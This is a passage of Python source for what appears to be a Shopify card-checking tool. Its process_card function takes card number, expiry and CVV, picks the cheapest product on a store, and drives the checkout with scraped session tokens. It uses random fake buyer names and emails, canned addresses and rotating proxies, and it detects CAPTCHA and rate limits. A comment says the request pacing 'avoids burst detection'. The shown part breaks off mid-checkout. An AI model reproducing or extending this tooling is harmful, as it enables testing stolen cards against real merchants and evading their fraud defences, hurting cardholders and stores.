componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""


C2C = {
    "USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE",
    "HKD": "HK", "GBP": "GB", "CHF": "CH",
    "EUR": "DE", "AUD": "AU", "NZD": "NZ", "JPY": "JP",
    "SGD": "SG", "SEK": "SE", "NOK": "NO", "DKK": "DK",
    "PLN": "PL", "CZK": "CZ", "MXN": "MX", "BRL": "BR",
    "KRW": "KR", "THB": "TH", "MYR": "MY", "PHP": "PH",
    "IDR": "ID", "TWD": "TW", "ZAR": "ZA", "ILS": "IL",
    "TRY": "TR", "SAR": "SA", "QAR": "QA", "KWD": "KW",
    "CNY": "CN", "HUF": "HU", "RON": "RO", "BGN": "BG",
    "CLP": "CL", "COP": "CO", "PEN": "PE", "ARS": "AR",
}

book = {
    "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DE": {"address1": "Friedrichstr 100", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "3012345678"},
    "NZ": {"address1": "1 Queen Street", "city": "Auckland", "postalCode": "1010", "zoneCode": "AUK", "countryCode": "NZ", "phone": "91234567"},
    "JP": {"address1": "1-1 Marunouchi", "city": "Tokyo", "postalCode": "100-0005", "zoneCode": "JP-13", "countryCode": "JP", "phone": "312345678"},
    "SG": {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616", "zoneCode": "", "countryCode": "SG", "phone": "61234567"},
    "SE": {"address1": "Drottninggatan 1", "city": "Stockholm", "postalCode": "11151", "zoneCode": "", "countryCode": "SE", "phone": "812345678"},
    "NO": {"address1": "Karl Johans gate 1", "city": "Oslo", "postalCode": "0154", "zoneCode": "", "countryCode": "NO", "phone": "21234567"},
    "DK": {"address1": "Stroget 1", "city": "Copenhagen", "postalCode": "1000", "zoneCode": "", "countryCode": "DK", "phone": "31234567"},
    "FR": {"address1": "1 Rue de Rivoli", "city": "Paris", "postalCode": "75001", "zoneCode": "", "countryCode": "FR", "phone": "142345678"},
    "MX": {"address1": "Reforma 222", "city": "Mexico City", "postalCode": "06600", "zoneCode": "CDMX", "countryCode": "MX", "phone": "5512345678"},
    "BR": {"address1": "Av Paulista 1000", "city": "Sao Paulo", "postalCode": "01310-100", "zoneCode": "SP", "countryCode": "BR", "phone": "1112345678"},
    "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}


def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()
    if tcn in book:
        return book[tcn]
    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    if ccn and ccn in book:
        return book[ccn]
    return book["DEFAULT"]


def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None


_UUID_RE = re.compile(
    r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}'
)


def _unescape_checkout_html(text):
    if not text:
        return ''
    out = (
        text.replace('&quot;', '"')
            .replace('&#34;', '"')
            .replace('&#39;', "'")
            .replace('&amp;', '&')
            .replace('\\u0022', '"')
            .replace('\\u0027', "'")
            .replace('\\"', '"')
    )
    try:
        import html as _html
        out = _html.unescape(out)
    except Exception:
        pass
    return out


def extract_checkout_stable_id(text):
    if not text:
        return None

    raw = _unescape_checkout_html(text)
    candidates = []

    for src, start, end in (
        (text, 'stableId&quot;:&quot;', '&quot;'),
        (text, 'stableId&#34;:&#34;', '&#34;'),
        (text, '\\"stableId\\":\\"', '\\"'),
        (text, 'stableId\\u0022:\\u0022', '\\u0022'),
        (raw, '"stableId":"', '"'),
        (raw, '"stableId": "', '"'),
        (raw, 'stableId":"', '"'),
    ):
        val = extract_between(src, start, end)
        if val:
            candidates.append(val.strip())

    for src in (raw, text):
        for m in re.finditer(r'stableId', src, flags=re.I):
            window = src[m.start(): m.start() + 120]
            candidates.extend(_UUID_RE.findall(window))
        candidates.extend(re.findall(r'"stableId"\s*:\s*"([^"]+)"', src))
        candidates.extend(re.findall(r'stableId&quot;:&quot;([^&]+)&quot;', src))

    seen = set()
    ordered = []
    for c in candidates:
        if not c or not isinstance(c, str):
            continue
        c = c.strip().strip('\\').strip('"').strip("'")
        if not c or c in seen:
            continue
        seen.add(c)
        ordered.append(c)

    for c in ordered:
        if _UUID_RE.fullmatch(c):
            return c
    for c in ordered:
        if re.fullmatch(r'[0-9a-fA-F]{32}', c):
            return f"{c[0:8]}-{c[8:12]}-{c[12:16]}-{c[16:20]}-{c[20:32]}".lower()
    for c in ordered:
        if 8 <= len(c) <= 80 and re.match(r'^[A-Za-z0-9_-]+$', c):
            return c
    return None


def get_random_string(length=11):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))


class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}{random.randint(100,9999)}@{random.choice(domains)}"


def parse_proxy(proxy_str):
    if proxy_str is None:
        return None
    raw = str(proxy_str).strip().strip("'\"")
    if not raw:
        return None

    lower = raw.lower()
    scheme = None
    for prefix in ('socks5h://', 'socks5://', 'socks4a://', 'socks4://', 'socks://', 'https://', 'http://'):
        if lower.startswith(prefix):
            scheme = prefix.rstrip(':/').replace('socks5h', 'socks5').replace('socks4a', 'socks4')
            if scheme == 'socks':
                scheme = 'socks5'
            raw = raw[len(prefix):]
            break
    if scheme is None:
        scheme = 'http'

    if '@' in raw:
        auth, hostport = raw.rsplit('@', 1)
        auth = auth.lstrip('/')
        hostport = hostport.strip('/')
        if not hostport or ':' not in hostport:
            return None
        host, port = hostport.rsplit(':', 1)
        if not host or not port:
            return None
        from urllib.parse import quote
        if ':' in auth:
            user, password = auth.split(':', 1)
        else:
            user, password = auth, ''
        user_q = quote(user, safe='')
        pass_q = quote(password, safe='')
        return f"{scheme}://{user_q}:{pass_q}@{host}:{port}"

    parts = raw.strip('/').split(':')
    from urllib.parse import quote
    if len(parts) == 2:
        host, port = parts
        if not host or not port:
            return None
        return f"{scheme}://{host}:{port}"
    if len(parts) == 4:
        if parts[1].isdigit():
            host, port, user, password = parts
        elif parts[3].isdigit():
            user, password, host, port = parts
        else:
            host, port, user, password = parts
        user_q = quote(user, safe='')
        pass_q = quote(password, safe='')
        return f"{scheme}://{user_q}:{pass_q}@{host}:{port}"
    return None


def proxy_status_label(proxy_str, proxy_url, dead=False):
    if not proxy_str:
        return "Not Used"
    if dead or not proxy_url:
        return "Dead"
    return "Live"


def is_socks_proxy(proxy_url):
    if not proxy_url:
        return False
    return proxy_url.lower().startswith(('socks://', 'socks4://', 'socks5://', 'socks4a://', 'socks5h://'))


def build_proxy_connector(proxy_url=None):
    """Return (connector, request_proxy).

    PATCHED: HTTP(S) branch now keeps sockets alive so the ~7 checkout requests
    in a single flow reuse the same TLS connection instead of paying a fresh
    handshake every time. This is the single biggest latency win.
    """
    if proxy_url and is_socks_proxy(proxy_url):
        try:
            from aiohttp_socks import ProxyConnector
        except ImportError as e:
            raise RuntimeError("SOCKS proxy requires aiohttp-socks package") from e
        return ProxyConnector.from_url(proxy_url, rdns=True, ssl=False), None

    connector = aiohttp.TCPConnector(
        ssl=False,
        limit=0,
        limit_per_host=0,
        force_close=False,            # <-- was True; keep-alive ON
        ttl_dns_cache=300,            # cache DNS for 5 min
        keepalive_timeout=30,         # hold idle sockets 30s
        enable_cleanup_closed=True,
    )
    return connector, proxy_url


def is_proxy_connection_error(exc):
    msg = str(exc).lower()
    indicators = (
        'proxy', 'socks', 'tunnel', '407', 'cannot connect to host',
        'connection refused', 'network unreachable', 'timed out',
        'timeout', 'server disconnected', 'clientconnectorerror',
        'clientproxyconnectionerror', 'proxyconnectionerror',
    )
    return any(x in msg for x in indicators)


def is_captcha_required(response_text):
    if not response_text:
        return False
    indicators = ['CAPTCHA_REQUIRED', '"code":"CAPTCHA_REQUIRED"', 'captcha required', 'hcaptcha', 'h-captcha']
    text_upper = response_text.upper()
    for indicator in indicators:
        if indicator.upper() in text_upper:
            return True
    return False


def _normalize_domain(domain):
    if not domain.startswith('http'):
        domain = "https://" + domain
    return domain.rstrip('/')


def _product_fetch_headers(domain):
    base = _normalize_domain(domain)
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': base + '/',
    }


def _checkout_headers(domain):
    base = _normalize_domain(domain)
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Origin': base,
        'Referer': base + '/',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }


STOREFRONT_API_VERSIONS = ['2025-01', '2024-10', '2024-07', '2024-01']

STOREFRONT_PRODUCTS_QUERY = """query FetchProducts($first: Int!) {
  products(first: $first) {
    edges {
      node {
        handle
        variants(first: 50) {
          edges {
            node {
              id
              availableForSale
              requiresShipping
              price {
                amount
              }
            }
          }
        }
      }
    }
  }
}"""


def _variant_id_from_gid(gid):
    if not gid:
        return None
    match = re.search(r'ProductVariant/(\d+)', str(gid))
    return match.group(1) if match else None


async def _extract_storefront_token(session, domain, proxy, headers):
    try:
        async with session.get(domain, proxy=proxy, timeout=10) as resp:
            if resp.status != 200:
                return None
            text = await resp.text()
    except aiohttp.ClientError:
        return None
    for pattern in [
        r'storefrontAccessToken["\']?\s*[:=]\s*["\']([a-f0-9]{32})',
        r'accessToken["\']?\s*[:=]\s*["\']([a-f0-9]{32})',
    ]:
        match = re.search(pattern, text, re.I)
        if match:
            return match.group(1)
    return None


async def _storefront_graphql(session, domain, query, variables, proxy, headers, token=None, api_version=None):
    version = api_version or STOREFRONT_API_VERSIONS[0]
    url = f"{domain}/api/{version}/graphql.json"
    gql_headers = {
        **headers,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
    }
    if token:
        gql_headers['X-Shopify-Storefront-Access-Token'] = token
    payload = {'query': query, 'variables': variables}
    async with session.post(url, json=payload, headers=gql_headers, proxy=proxy, timeout=15) as resp:
        text = await resp.text()
        if resp.status != 200:
            return None, f"GraphQL status {resp.status}"
        try:
            body = json.loads(text)
        except json.JSONDecodeError:
            return None, "Invalid GraphQL response"
        if body.get('errors'):
            err = body['errors'][0]
            return None, err.get('message', 'GraphQL error')
        if not body.get('data'):
            return None, "Empty GraphQL data"
        return body['data'], None


def _pick_cheapest_from_storefront_products(data, domain):
    bands = (1.0, 5.0, 10.0, float('inf'))
    best = {
        b: {'ship': None, 'ship_price': float('inf'), 'any': None, 'any_price': float('inf')}
        for b in bands
    }

    for edge in (data.get('products') or {}).get('edges') or []:
        node = edge.get('node') or {}
        handle = node.get('handle', '')
        for v_edge in (node.get('variants') or {}).get('edges') or []:
            variant = v_edge.get('node') or {}
            if not variant.get('availableForSale', False):
                continue
            variant_id = _variant_id_from_gid(variant.get('id'))
            if not variant_id:
                continue
            try:
                price_str = (variant.get('price') or {}).get('amount', '0')
                price = float(str(price_str).replace(',', ''))
            except (ValueError, TypeError):
                continue
            if price <= 0:
                continue
            candidate = {
                'site': domain,
                'price': f"{price:.2f}",
                'variant_id': str(variant_id),
                'link': f"{domain}/products/{handle}" if handle else domain,
            }
            for band in bands:
                if price <= band:
                    slot = best[band]
                    if variant.get('requiresShipping', True) and price < slot['ship_price']:
                        slot['ship_price'] = price
                        slot['ship'] = candidate
                    if price < slot['any_price']:
                        slot['any_price'] = price
                        slot['any'] = candidate
                    break

    for band in bands:
        slot = best[band]
        picked = slot['ship'] or slot['any']
        if picked:
            return picked
    return None


async def fetch_products(domain, proxy_str=None, session=None, request_proxy=None):
    try:
        domain = _normalize_domain(domain)
        headers = _product_fetch_headers(domain)
        variables = {'first': 100}
        owns_session = session is None

        if owns_session:
            proxy_url = parse_proxy(proxy_str) if proxy_str else None
            if proxy_str and not proxy_url:
                return False, "Invalid proxy format"
            connector, request_proxy = build_proxy_connector(proxy_url)
            timeout = aiohttp.ClientTimeout(total=12)
            session = aiohttp.ClientSession(connector=connector, timeout=timeout, headers=headers)

        try:
            data = None
            last_error = None
            for _api_ver in STOREFRONT_API_VERSIONS:
                data, err = await _storefront_graphql(
                    session, domain, STOREFRONT_PRODUCTS_QUERY, variables,
                    request_proxy, headers, token=None, api_version=_api_ver,
                )
                if data and data.get('products'):
                    break
                last_error = err
                if err and '404' not in str(err):
                    break
            if not data or not data.get('products'):
                token = await _extract_storefront_token(session, domain, request_proxy, headers)
                if token:
                    for _api_ver in STOREFRONT_API_VERSIONS:
                        data, err = await _storefront_graphql(
                            session, domain, STOREFRONT_PRODUCTS_QUERY, variables,
                            request_proxy, headers, token=token, api_version=_api_ver,
                        )
                        if data and data.get('products'):
                            break
                        last_error = err
                        if err and '404' not in str(err):
                            break
            if not data or not data.get('products'):
                last_error = last_error or "Storefront GraphQL failed"
                if 'shopify' in last_error.lower() or last_error.startswith('GraphQL'):
                    return False, f"Site Error! {last_error}"
                return False, "Not Shopify!" if 'GraphQL status' in str(last_error) else last_error

            min_product = _pick_cheapest_from_storefront_products(data, domain)
            if isinstance(min_product, dict) and min_product.get('variant_id'):
                return min_product
            return False, "No Valid Products"
        finally:
            if owns_session:
                await session.close()
    except aiohttp.ClientError as e:
        return False, f"Proxy Error: {str(e)}"
    except OSError as e:
        return False, f"Proxy Error: {str(e)}"
    except Exception as e:
        msg = str(e)
        if proxy_str and ('proxy' in msg.lower() or 'socks' in msg.lower()):
            return False, f"Proxy Error: {msg}"
        return False, f"error: {msg}"


# PATCHED: tighter pacing — negligible wall-clock cost, still avoids burst detection
STEP_PAUSE_MIN = 0.005
STEP_PAUSE_MAX = 0.02
START_STAGGER_SEC = 0.0

_start_gate_lock = None
_last_start_ts = 0.0


def _get_start_gate_lock():
    global _start_gate_lock
    if _start_gate_lock is None:
        _start_gate_lock = asyncio.Lock()
    return _start_gate_lock


async def _admit_checkout():
    global _last_start_ts
    async with _get_start_gate_lock():
        now = time.time()
        wait = START_STAGGER_SEC - (now - _last_start_ts)
        if wait > 0:
            await asyncio.sleep(wait)
        _last_start_ts = time.time()


async def _step_sleep(proxy_status, label):
    delay = random.uniform(STEP_PAUSE_MIN, STEP_PAUSE_MAX)
    await asyncio.sleep(delay)


async def _pace_response(start_time, proxy_status='Not Used'):
    pass


def _extract_tax_amount(tax_obj):
    if not tax_obj or not isinstance(tax_obj, dict):
        return None, None, repr(tax_obj)[:200]
    typename = tax_obj.get('__typename')
    if typename == 'PendingTerms':
        return None, typename, f"pollDelay={tax_obj.get('pollDelay')}"
    if typename != 'FilledTaxTerms':
        return None, typename, str(tax_obj)[:300]
    raw = (
        (tax_obj.get('totalTaxAmountV2') or {}).get('amount')
        or ((tax_obj.get('totalTaxAmount') or {}).get('value') or {}).get('amount')
    )
    try:
        return float(raw), typename, f"amount={raw}"
    except (TypeError, ValueError):
        return None, typename, f"unparseable={raw!r} keys={list(tax_obj.keys())}"


def _tax_term_input(tax_amount, currency, prefer_any=False):
    if prefer_any or tax_amount is None:
        proposed = {'any': True}
    else:
        proposed = {'value': {'amount': f"{float(tax_amount):.2f}", 'currencyCode': currency}}
    return {
        'proposedAllocations': None,
        'proposedTotalAmount': proposed,
        'proposedTotalIncludedAmount': None,
        'proposedMixedStateTotalAmount': None,
        'proposedExemptions': [],
    }


def _apply_seller_money(seller, totals):
    if not seller or not isinstance(seller, dict):
        return None, None, None
    rt = ((seller.get('runningTotal') or {}).get('value') or {}).get('amount')
    if rt is not None:
        totals['running_total'] = rt
        if not ((seller.get('checkoutTotal') or {}).get('value') or {}).get('amount'):
            totals['total_price'] = rt
    ct = ((seller.get('checkoutTotal') or {}).get('value') or {}).get('amount')
    if ct is not None:
        totals['total_price'] = ct
    else:
        tt = ((seller.get('total') or {}).get('value') or {}).get('amount')
        if tt is not None:
            totals['total_price'] = tt
    ms = ((seller.get('subtotalBeforeTaxesAndShipping') or {}).get('value') or {}).get('amount')
    if ms is not None:
        totals['merchandise_subtotal'] = ms
    for src in (seller.get('checkoutTotal'), seller.get('runningTotal'), seller.get('total')):
        cur = ((src or {}).get('value') or {}).get('currencyCode')
        if cur:
            totals['currency'] = cur
            break
    new_tax, tax_type, tax_detail = _extract_tax_amount(seller.get('tax') or {})
    if new_tax is not None:
        totals['tax_amount'] = float(new_tax)
    return tax_type, tax_detail, new_tax


def _apply_seller_delivery(seller, ship_state):
    if not seller or not isinstance(seller, dict):
        return False
    found = False
    del_delivery = seller.get('delivery') or {}
    try:
        eta = del_delivery.get('progressiveRatesEstimatedTimeUntilCompletion')
        if eta:
            ship_state['rate_pending_ms'] = int(eta)
        elif del_delivery.get('intermediateRates'):
            ship_state['rate_pending_ms'] = ship_state.get('rate_pending_ms') or 1000
    except (TypeError, ValueError):
        pass

    if del_delivery.get('__typename') == 'FilledDeliveryTerms':
        del_lines = del_delivery.get('deliveryLines') or []
        if del_lines:
            line = del_lines[0]
            sel = line.get('selectedDeliveryStrategy') or {}
            sel_handle = sel.get('handle') if isinstance(sel, dict) else None
            if sel_handle:
                ship_state['delivery_strategy'] = sel_handle
                found = True
            strats = line.get('availableDeliveryStrategies') or []
            if strats:
                chosen = None
                for strat in strats:
                    if ship_state.get('delivery_strategy') and strat.get('handle') == ship_state['delivery_strategy']:
                        chosen = strat
                        break
                if chosen is None:
                    chosen = strats[0]
                    if chosen.get('handle'):
                        ship_state['delivery_strategy'] = chosen['handle']
                        found = True
                sa = ((chosen.get('amount') or {}).get('value') or {}).get('amount')
                if sa is not None:
                    try:
                        ship_state['shipping_amount'] = float(sa)
                    except (TypeError, ValueError):
                        pass
                found = found or bool(ship_state.get('delivery_strategy'))
            target_merch = line.get('targetMerchandise') or {}
            merch_lines_v2 = target_merch.get('linesV2') or []
            if merch_lines_v2:
                merch_item = (merch_lines_v2[0].get('merchandise') or {})
                if merch_item.get('requiresShipping') is False:
                    ship_state['requires_shipping'] = False

    del_exp = seller.get('deliveryExpectations') or {}
    if del_exp.get('__typename') == 'FilledDeliveryExpectationTerms':
        for exp in del_exp.get('deliveryExpectations') or []:
            if exp.get('deliveryStrategyHandle') == ship_state.get('delivery_strategy') and exp.get('signedHandle'):
                ship_state['signed_handle'] = exp['signedHandle']
                break
        if not ship_state.get('signed_handle'):
            exps = del_exp.get('deliveryExpectations') or []
            if exps and exps[0].get('signedHandle'):
                ship_state['signed_handle'] = exps[0]['signedHandle']
    return found


def _reject_needs_term_accept(rej_codes):
    for c in rej_codes:
        if not isinstance(c, str):
            continue
        cu = c.upper()
        if (
            'TAX_NEW_TAX' in cu
            or cu.startswith('DELIVERY_')
            or cu in ('WAITING_PENDING_TERMS', 'ORDER_TOTAL_CHANGED', 'PAYMENT_AMOUNT_CHANGED')
            or 'MUST_BE_ACCEPTED' in cu
            or 'DETAIL_CHANGED' in cu
        ):
            return True
    return False


def _pending_poll_ms(seller):
    if not isinstance(seller, dict):
        return 1000
    for key in ('tax', 'delivery', 'payment', 'merchandise'):
        obj = seller.get(key) or {}
        if obj.get('__typename') == 'PendingTerms':
            try:
                return int(obj.get('pollDelay') or 1000)
            except (TypeError, ValueError):
                return 1000
    deliv = seller.get('delivery') or {}
    try:
        eta = deliv.get('progressiveRatesEstimatedTimeUntilCompletion')
        if eta:
            return int(eta)
    except (TypeError, ValueError):
        pass
    return 1000


def _non_json_response_code(status, body):
    text = (body or '').lstrip()
    if status in (429, 430, 503):
        return "RATE_LIMITED"
    low = text[:300].lower()
    if not text:
        return "RATE_LIMITED"
    if text.startswith('<!') or text.startswith('<html') or '<html' in low[:80]:
        if any(x in low for x in ('captcha', 'challenge', 'bot')):
            return "CAPTCHA_REQUIRED"
        return "RATE_LIMITED"
    if 'throttl' in low or 'too many' in low or 'rate limit' in low:
        return "RATE_LIMITED"
    return "UNPARSEABLE_RESPONSE"


def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    if '3DS_REQUIRED' in message.upper():
        return '3DS_REQUIRED'
    code_match = re.search(r'"code"\s*:\s*"([^"]+)"', message)
    if code_match:
        return code_match.group(1)
    stripped = message.strip()
    if re.match(r'^[A-Z][A-Z0-9_]+$', stripped):
        return stripped
    return message[:80]


async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    start_time = time.time()
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    proxy_url = parse_proxy(proxy_str) if proxy_str else None
    if proxy_str and not proxy_url:
        return False, "Invalid proxy format", gateway, total_price, currency, "Dead"
    proxy_status = proxy_status_label(proxy_str, proxy_url, dead=False)
    checkpoint_data = None
    queueToken = None

    try:
        headers = _checkout_headers(ourl)

        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""

        connector, proxy = build_proxy_connector(proxy_url)
        # PATCHED: tighter timeouts — bounded worst-case
        timeout = aiohttp.ClientTimeout(total=22, sock_connect=8, sock_read=12)
        await _step_sleep(proxy_status, 'session_open')

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl

            if not variant_id:
                info = await fetch_products(ourl, proxy_str, session=session, request_proxy=proxy)
                if isinstance(info, tuple) and info[0] is False:
                    err = info[1]
                    if proxy_str and ('Proxy' in str(err) or 'proxy' in str(err).lower()):
                        proxy_status = "Dead"
                    return False, err, gateway, total_price, currency, proxy_status
                variant_id = info['variant_id']
                await _step_sleep(proxy_status, 'after_products')

            checkout_headers = {**headers, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1'}
            permalink = f"{url}/cart/{variant_id}:1"
            response = await session.get(permalink, allow_redirects=True, headers=checkout_headers, proxy=proxy)
            checkout_url = str(response.url)
            text = await response.text()
            await _step_sleep(proxy_status, 'after_checkout')

            attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
            if not attempt_token_match:
                attempt_token_match = re.search(r'/checkouts/(?:c/)?([^/?]+)', checkout_url)
            attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]

            sst = response.headers.get('X-Checkout-One-Session-Token') or response.headers.get('x-checkout-one-session-token')
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&quot;')
            if not sst:
                sst = extract_between(text, 'name="serialized-sessionToken" content="', '"')
            if not sst:
                sst = extract_between(text, '"serializedSessionToken":"', '"')
            if not sst:
                sst = extract_between(text, 'data-session-token="', '"')
            if not sst:
                raw_tmp = _unescape_checkout_html(text)
                sst = extract_between(raw_tmp, '"serializedSessionToken":"', '"') or extract_between(raw_tmp, '"sessionToken":"', '"')

            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency, proxy_status

            raw_unescaped = _unescape_checkout_html(text)

            queueToken = (
                extract_between(text, 'queueToken&quot;:&quot;', '&quot;')
                or extract_between(text, '"queueToken":"', '"')
                or extract_between(raw_unescaped, '"queueToken":"', '"')
            )
            stableId = extract_checkout_stable_id(text)
            if not stableId:
                stableId = str(uuid.uuid4())
            if not sst:
                text_l = text.lower()
                if 'password' in text_l and ('enter' in text_l or 'store' in text_l):
                    return False, "Site is password protected", gateway, total_price, currency, proxy_status
                if response.status in (429, 430, 503):
                    return False, "RATE_LIMITED", gateway, total_price, currency, proxy_status
                return False, "CHECKOUT_SESSION_FAILED", gateway, total_price, currency, proxy_status

            await _step_sleep(proxy_status, 'after_stableId')

            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"')
            if not merch:
                merch = extract_between(raw_unescaped, 'ProductVariantMerchandise/', '"')
            if not merch:
                merch = str(variant_id)

            currency = 'USD'
            if 'currencyCode&quot;:&quot;' in text:
                currency = extract_between(text, 'currencyCode&quot;:&quot;', '&quot;') or 'USD'
            elif '"currencyCode":"' in raw_unescaped:
                currency = extract_between(raw_unescaped, '"currencyCode":"', '"') or 'USD'

            build_id = None
            build_match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', raw_unescaped)
            if build_match:
                build_id = build_match.group(1)
            if not build_id:
                build_match2 = re.search(r'checkoutWebBuildId":"([^"]+)"', raw_unescaped)
                build_id = build_match2.group(1) if build_match2 else ""

            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')
            if not source_token:
                source_match = re.search(r'checkoutWebSourceId":"([^"]+)"', raw_unescaped)
                source_token = source_match.group(1) if source_match else ""

            pci_url = "https://checkout.pci.shopifyinc.com/sessions"
            pci_match = re.search(r'checkoutCardsinkUrl":"([^"]+)"', raw_unescaped)
            if pci_match:
                pci_url = pci_match.group(1)
                if not pci_url.endswith('/sessions'):
                    pci_url = pci_url.rstrip('/') + '/sessions'

            ident_sig = None
            ident_match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', raw_unescaped)
            if ident_match:
                ident_sig = ident_match.group(1)

            if not sst:
                if 'password' in text.lower() and ('enter' in text.lower() or 'store' in text.lower()):
                    return False, "Site is password protected", gateway, total_price, currency, proxy_status
                elif response.status in (429, 430, 503) or 'throttl' in text.lower():
                    return False, "RATE_LIMITED", gateway, total_price, currency, proxy_status
                else:
                    return False, "Site not supported", gateway, total_price, currency, proxy_status

            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token

            graphql_host = urlparse(checkout_url).netloc or urlparse(ourl).netloc
            graphql_url = f'https://{graphql_host}/checkouts/unstable/graphql'
            params = {'operationName': 'Proposal'}
